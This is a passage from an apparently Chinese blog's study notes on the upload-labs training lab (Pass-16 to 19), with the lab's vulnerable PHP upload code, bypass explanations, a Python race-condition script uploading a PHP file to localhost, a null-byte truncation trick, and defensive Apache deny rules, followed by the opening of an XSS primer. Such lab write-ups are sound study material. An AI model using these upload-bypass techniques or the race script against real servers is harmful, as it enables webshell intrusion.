class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="variable">$newimagepath</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$newimagepath</span>);</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是可以直接传图马。</p>
<p>不过直接传<strong>php</strong>改<strong>jpg</strong>后缀的就行，<strong>jpg</strong>合成的图马会被二次渲染生成，其中插着的代码会被破坏。</p>
<p>后来看题解说需要自己根据正常图片上传后二次渲染后生成的图片和原本的图片比较数据块，然后在相同的数据块部分插入代码。具体实现需要自己写脚本。</p>
<h4 id="pass-17">Pass-17</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是传图马上去就行，后来看题解的时候才发现正确的姿势。</p>
<p>源码18行中<strong>unlink</strong>函数的作用是删除不符合规范的文件。</p>
<p>那么此处就是一个竞争了，写一个脚本不停的传🐎。</p>
<p>抄一下代码做笔记。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">lists</span>):</span><br><span class="line">    hh = hackhttp.hackhttp()</span><br><span class="line">    raw = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /upload-labs/Pass-17/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://localhost/upload-labs/Pass-17/index.php</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------226482744623805</span></span><br><span class="line"><span class="string">Content-Length: 329</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------226482744623805</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="string">-----------------------------226482744623805</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä¸ä¼ </span></span><br><span class="line"><span class="string">-----------------------------226482744623805--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    code, head, html, redirect, log = hh.http(<span class="string">&#x27;http://localhost/upload-labs/Pass-17/index.php&#x27;</span>, raw=raw)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(code) + <span class="string">&quot;\r&quot;</span>)</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">10</span>)</span><br><span class="line">pool.<span class="built_in">map</span>(upload, <span class="built_in">range</span>(<span class="number">10000</span>))</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
<h4 id="pass-18">Pass-18</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =<span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">MyUpload</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;<span class="title function_ invoke__">upload</span>(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isUploadedFile</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setDir</span>( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkExtension</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkSize</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkFileExists</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable language_">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">renameFile</span>();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">resultUpload</span>( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>竞争改名，题解同<strong>Pass-17</strong>的脚本。不过把上传的文件改成了<strong>filename.php.7z</strong>【雾。</p>
<h4 id="pass-19">Pass-19</h4>
<p>源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span>	 .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>是个<strong>00</strong>截断。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../upload/1.php□.jpg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;250px&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="总结">总结</h3>
<ol type="1">
<li><p>对上传文件的后缀名进行小写转换再用白名单过滤。</p></li>
<li><p>对文件进行重命名。</p></li>
<li><p>及时更新<strong>WEBserver</strong>的服务，修复最新的漏洞。</p></li>
<li><p>对上传文件的文件夹做访问限制，只允许访问特定文件。</p></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order deny,allow</span><br><span class="line">deny from all</span><br></pre></td></tr></table></figure>
<ol start="5" type="1">
<li>由于可能会上传<strong>PHP</strong>等脚本文件，所以禁止上传文件的文件夹运行脚本。</li>
</ol>
<figure class="highlight d"><table><tr><td class="code"><pre><span class="line">&lt;Directory <span class="string">&quot;/var/www/html/upload/data/attachment&quot;</span>&gt;</span><br><span class="line">	&lt;FilesMatch <span class="string">&quot;.(php|asp|jsp)$&quot;</span>&gt;</span><br><span class="line">  		Deny from all</span><br><span class="line"> 	&lt;/FilesMatch&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>文件上传</tag>
        <tag>Web安全修炼计划</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全XSS修炼计划</title>
    <url>/Study-XSS/</url>
    <content><![CDATA[<h3 id="前言">前言</h3>
<p><strong>XSS</strong>全称为跨站脚本攻击<strong>【Cross Site
Scripting</strong>，为不与层叠样式表<strong>【Cascading Style Sheets,
CSS</strong>缩写混淆，故此名为<strong>XSS</strong>。</p>
<p><strong>XSS</strong>恶意攻击者往<strong>Web</strong>页面里插入恶意<strong>Script</strong>代码，当用户浏览该页之时，嵌入其中<strong>Web</strong>里面的<strong>Script</strong>代码会被执行，从而达到恶意攻击用户的目的。</p>
<span id="more"></span>
<h3 id="原理">原理</h3>
<ul>
<li>攻击者对含有漏洞的服务器发起<strong>XSS</strong>攻击【注入<strong>JS</strong>代码。</li>
<li>诱使受害者打开受到攻击的服务器<strong>URL</strong>。</li>
<li>受害者在<strong>Web</strong>浏览器中打开<strong>URL</strong>，恶意脚本执行。</li>
</ul>
<h3 id="攻击方式">攻击方式</h3>
<p><strong>XSS</strong>可以分成二类：</p>
<ul>
<li>非持久型<strong>XSS</strong>攻击：顾名思义，非持久型<strong>XSS</strong>攻击是一次性的，仅对当次的页面访问产生影响。非持久型<strong>XSS</strong>攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</li>
<li>持久型<strong>XSS</strong>攻击：持久型<strong>XSS</strong>，会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。</li>
</ul>
<p><strong>XSS</strong>也可以分成三类：</p>
<ul>
<li>反射型：经过后端，不经过数据库。</li>
<li>存储型：经过后端，经过数据库。</li>
<li><strong>DOM</strong>型：不经过后端，<strong>DOM-Based
XSS</strong>漏洞是基于文档对象模型<strong>【Document Objeet
Model,DOM</strong>的一种漏洞，<strong>DOM-XSS</strong>是通过<strong>URL</strong>传入参数去控制触发的。</li>
</ul>
<h3 id="反射型xss例题">反射型XSS例题</h3>
<p>题目出自这位<a
href="https://xss.haozi.me/"><strong>dalao</strong></a>。</p>
<h4 id="x00">0X00</h4>
<h5 id="server-code">Server Code</h5>
